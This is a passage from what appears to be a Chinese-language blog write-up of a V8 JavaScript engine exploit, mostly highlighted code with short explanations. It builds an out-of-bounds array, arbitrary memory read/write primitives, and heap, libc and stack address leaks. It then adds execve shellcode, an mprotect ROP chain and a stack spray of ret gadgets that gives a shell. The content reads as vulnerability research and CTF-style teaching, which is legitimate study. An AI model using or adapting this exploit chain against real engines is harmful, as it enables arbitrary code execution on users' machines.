class="line"><span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line"><span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line"><span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">&#125;</span><br><span class="line">d2u(val)&#123;<span class="comment">//double ==&gt; Uint64</span></span><br><span class="line"><span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line"><span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line"><span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">u2d(val)&#123;<span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line"><span class="keyword">let</span> tmp = [];</span><br><span class="line">tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line"><span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br></pre></td></tr></table></figure><h2 id="任意读写能力"><a href="#任意读写能力" class="headerlink" title="任意读写能力"></a>任意读写能力</h2><p>根据前文对poc的分析，可以知道，我们能够构造出一个可以越界访问的数组（属性length值 &gt; 实际长度）。<br>那么，如果可以在该数组后面内存中布置一些我们可控的对象，如ArrayBuffer，那么就可以通过修改BackingStore来实现任意读写了。<br>这里，我们还想要能够泄露任意对象的地址，可以在oobArray后布置一个普通js对象，只要将目标对象作为该对象的属性值（in-object属性），然后通过越界读取，就可以泄露出目标对象的地址了。</p><p>注意，利用过程需要使用release编译的文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> objs = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray; &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">&#123;</span><br><span class="line">counter : <span class="number">0</span>,</span><br><span class="line">next() &#123;</span><br><span class="line"><span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line"><span class="keyword">this</span>.counter++;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">oobArray.length = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i++) &#123;</span><br><span class="line">bufs.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1234</span>));</span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">'a'</span>: <span class="number">0x4321</span>, <span class="string">'b'</span>: <span class="number">0x9999</span>&#125;;</span><br><span class="line">objs.push(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">)&#125;);</span><br></pre></td></tr></table></figure><p>首先创建两个列表，bufs用于存储ArrayBuffer对象，objs用于存储普通Js对象</p><p>在最后一次迭代中，先将oobArray的长度缩减为1（不能为0，否则对象将被回收），然后创建100个ArrayBuffer对象和普通js对象，我们希望创建的这些对象能够有一个落在oobArray所在内存后方，能够通过越界访问控制。</p><p>然后我们就需要通过越界访问，对内存进行搜索，判断是否有我们创建的可控对象。<br>其中ArrayBuffer是通过搜索其length值0x1234（在内存中Smi表示为0x123400000000）来定位<br>普通js对象通过搜索其’a’属性的值0x4321（在内存中Smi表示为0x432100000000）来定位</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可控的buf在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> buf_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line"><span class="keyword">if</span>(val === <span class="number">0x123400000000</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"buf_offset: "</span> + i.toString());</span><br><span class="line">buf_offset = i;</span><br><span class="line">oobArray[i] = mem.u2d(<span class="number">0x121200000000</span>);<span class="comment">//修改可控buf的length，做个标记</span></span><br><span class="line">oobArray[i + <span class="number">3</span>] = mem.u2d(<span class="number">0x1212</span>);<span class="comment">//有两处保存了length值</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可控的obj在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> obj_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line"><span class="keyword">if</span>(val === <span class="number">0x432100000000</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"obj_offset: "</span> + i.toString());</span><br><span class="line">obj_offset = i;</span><br><span class="line">oobArray[i] = mem.u2d(<span class="number">0x567800000000</span>);<span class="comment">//修改可控obj的属性a，做个标记</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bufs中的第i个buf是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_buf_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bufs.length; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> val = bufs[i].byteLength;</span><br><span class="line">    <span class="keyword">if</span>(val === <span class="number">0x1212</span>)&#123;<span class="comment">//查找被修改了length的buf</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"found controllable buf at idx "</span> + i.toString());</span><br><span class="line">        controllable_buf_idx = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objs中第i个obj是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_obj_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; objs.length; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> val = objs[i].a;</span><br><span class="line"><span class="keyword">if</span>(val === <span class="number">0x5678</span>)&#123;<span class="comment">//查找属性a被修改了的obj</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"found controllable obj at idx "</span> + i.toString());</span><br><span class="line">controllable_obj_idx = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/post/abaa2e35/searchObj.png" alt="searchObj.png"><br><img src="/post/abaa2e35/searchObj2.png" alt="searchObj2.png"></p><p>这样我们就成功获得了一个可控的ArrayBuffer和一个JS对象，然后就可以写一个小工具来方便我们的任意读写了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">arbitraryRW</span></span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>(buf_offset, buf_idx, obj_offset, obj_idx)&#123;</span><br><span class="line"><span class="keyword">this</span>.buf_offset = buf_offset;</span><br><span class="line"><span class="keyword">this</span>.buf_idx = buf_idx;</span><br><span class="line"><span class="keyword">this</span>.obj_offset = obj_offset;</span><br><span class="line"><span class="keyword">this</span>.obj_idx = obj_idx;</span><br><span class="line">&#125;</span><br><span class="line">leak_obj(obj)&#123;</span><br><span class="line">objs[<span class="keyword">this</span>.obj_idx].a = obj;<span class="comment">//修改obj.a的值为目标对象</span></span><br><span class="line"><span class="keyword">return</span> mem.d2u(oobArray[<span class="keyword">this</span>.obj_offset]) - <span class="number">1</span>;<span class="comment">//读出属性a的值，因为oobArray是以double的格式读出，所以需要转换为Uint64</span></span><br><span class="line">&#125;</span><br><span class="line">read(addr)&#123;</span><br><span class="line"><span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);<span class="comment">//修改BackingStore指针指向目标地址</span></span><br><span class="line">oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);<span class="comment">//修改BitField指针指向目标地址（因为调试发现该值总和BackingStore相同）</span></span><br><span class="line"><span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">return</span> mem.d2u(tmp[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">write(addr, val)&#123;</span><br><span class="line"><span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);</span><br><span class="line">oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);</span><br><span class="line"><span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">tmp.set([mem.u2d(val)]);<span class="comment">//将欲存储的Uint64值转为double形式写入</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arw = <span class="keyword">new</span> arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);</span><br></pre></td></tr></table></figure><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>在拥有了任意读写的能力后，其实已经可以通过改写函数jit代码来实现任意代码执行了。<br>但是我在编译完v8后发现，该版本为6.7，恰好是已经不能够修改jit代码的版本了，所以还得使用其他办法（ROP）</p><h3 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h3><p>我们知道，BackingStore指针指向的就是系统堆的地址，只需要通过越界读取ArrayBuffer就能泄露出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> heap_addr = mem.d2u(oobArray[buf_offset + <span class="number">1</span>]) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"heap_addr: 0x"</span> + heap_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>关于泄露libc的办法，我没有在网上搜到比较详细的方法（没有看懂<a href="http://eternalsakura13.com/2018/11/19/justintime/" target="_blank" rel="noopener">Sakura师傅的方法</a>）</p><p>所以我采用了一个比较暴力的办法—————搜索堆内存。</p><p>因为ctf pwn的经验，我知道在堆内存中一定存在某个堆块的fd或者bk指向libc中的地址。所以我尝试通过堆块的size和prevsize遍历堆中的chunk，搜索libc地址。</p><p>这里我认为在fd或者bk位置上的数值，只要是0x7f开头的，一定是libc中的<code>&amp;main_arena+88</code>。<br>同时，又因为libc基址是12位对齐的，所以将搜索到的地址减去固定偏移<code>0x3c4000</code>（根据libc版本而定），即可获得基址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> curr_chunk = heap_addr;</span><br><span class="line"><span class="keyword">let</span> searched = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x5000</span>; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> size = arw.read(curr_chunk + <span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> prev_size = arw.read(curr_chunk);</span><br><span class="line"><span class="keyword">if</span>(size !== <span class="number">0</span> &amp;&amp; size % <span class="number">2</span> === <span class="number">0</span> &amp;&amp; prev_size &lt;= <span class="number">0x3f0</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> tmp_ptr = curr_chunk - prev_size;</span><br><span class="line"><span class="keyword">let</span> fd = arw.read(tmp_ptr + <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> bk = arw.read(tmp_ptr + <span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">parseInt</span>(fd / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">searched = fd;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">parseInt</span>(bk / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">searched = bk;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(size &lt; <span class="number">0x20</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">size = <span class="built_in">parseInt</span>(size / <span class="number">8</span>) * <span class="number">8</span></span><br><span class="line">curr_chunk += size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(searched !== <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> libc_base = <span class="built_in">parseInt</span>((searched - <span class="number">0x3c4000</span>) / <span class="number">0x1000</span>) * <span class="number">0x1000</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"searched libc_base: 0x"</span> + libc_base.toString(<span class="number">16</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Not found"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我是以事先泄露的堆地址为起点进行搜索的，所以平均情况下，实际只搜索了一半的堆内存，有一定几率没有结果。</p><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>泄露栈地址的原因在后文会进行解释。</p><p>在libc中存在一个全局变量叫做environ，是一个指向环境变量的指针，而环境变量恰好是存储在栈上高地址的，所以可以通过这个指针泄露出栈的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> environ_addr = libc_base + <span class="number">0x3C6F38</span>;</span><br><span class="line"><span class="keyword">let</span> stack_addr = arw.read(environ_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"stack_addr: 0x"</span> + stack_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>注意，在使用栈地址时要适当的减一些，不要修改到了高地址的环境变量，否则容易abort。</p><h2 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h2><p>在成功泄露出libc基址之后，如果按照ctf中getshell的思路，其实已经可以通过将malloc_hook修改为one_gadget实现getshell。</p><p>但是，这里我们想要获得的是任意代码执行，所以还是得通过shellcode的方案。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sc = [<span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0xd1</span>, <span class="number">0x9d</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0xd0</span>, <span class="number">0x8c</span>, <span class="number">0x97</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xdb</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">let</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++)&#123;</span><br><span class="line">shellcode[i] = sc[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_addr = arw.read(arw.leak_obj(shellcode) + <span class="number">0x68</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"shell_addr: 0x"</span> + shell_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>这里我将shellcode全部写入了一个ArrayBuffer中，然后泄露出了shellcode的地址</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>布置完成shellcode之后，我们需要通过rop来修改shellcode所在内存执行权限。</p><p>首先构造出我们的rop链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pop_rdi = <span class="number">0x0000000000021102</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rsi = <span class="number">0x00000000000202e8</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdx = <span class="number">0x0000000000001b92</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> mprotect = <span class="number">0x0000000000101770</span> +libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop =  [</span><br><span class="line">pop_rdi,</span><br><span class="line"><span class="built_in">parseInt</span>(shell_addr / <span class="number">0x1000</span>) * <span class="number">0x1000</span>,<span class="comment">//shellcode的地址，需要对齐</span></span><br><span class="line">pop_rsi,</span><br><span class="line"><span class="number">4096</span>,</span><br><span class="line">pop_rdx,</span><br><span class="line"><span class="number">7</span>,</span><br><span class="line">mprotect,<span class="comment">//调用mprotect修改内存权限</span></span><br><span class="line">shell_addr<span class="comment">//返回地址为shellcode</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>构造好rop链之后，就要考虑如何劫持程序流程到rop链上了。</p><p>前文我们成功泄露出了栈地址，这里我们将采用一个技巧（和堆喷类似，我叫它栈喷2333）。</p><p>因为我们获得的栈地址几乎可以说是栈最高的地址，所以我们可以在栈上地址由高到低连续布置retn，这样一旦程序的某个返回地址被我们的retn覆盖，那么程序就会不断的retn下去。</p><p>只要我们在最高地址处布置上我们的rop链，那么程序在经过一段retn之后，就会来到我们的rop链上了。</p><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> retn = <span class="number">0x000000000007EF0D</span> + libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop_start = stack_addr - <span class="number">8</span> * (rop.length + <span class="number">1</span>);<span class="comment">//先将栈提高，以免修改到了环境变量</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;</span><br><span class="line">arw.write(rop_start + <span class="number">8</span> * i, rop[i]);<span class="comment">//在高地址布置上我们的shellcode</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;<span class="comment">//不断向低地址写retn</span></span><br><span class="line">rop_start -= <span class="number">8</span>;</span><br><span class="line">arw.write(rop_start, retn);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"done"</span>);</span><br></pre></td></tr></table></figure><p>这里写入了0x100个retn是实验出来的，值太大或太小都不能成功。</p><h2 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h2><p><img src="/post/abaa2e35/getshell.png" alt="getshell.png"></p><p><strong>EXP</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>()&#123;</span><br><span class="line"><span 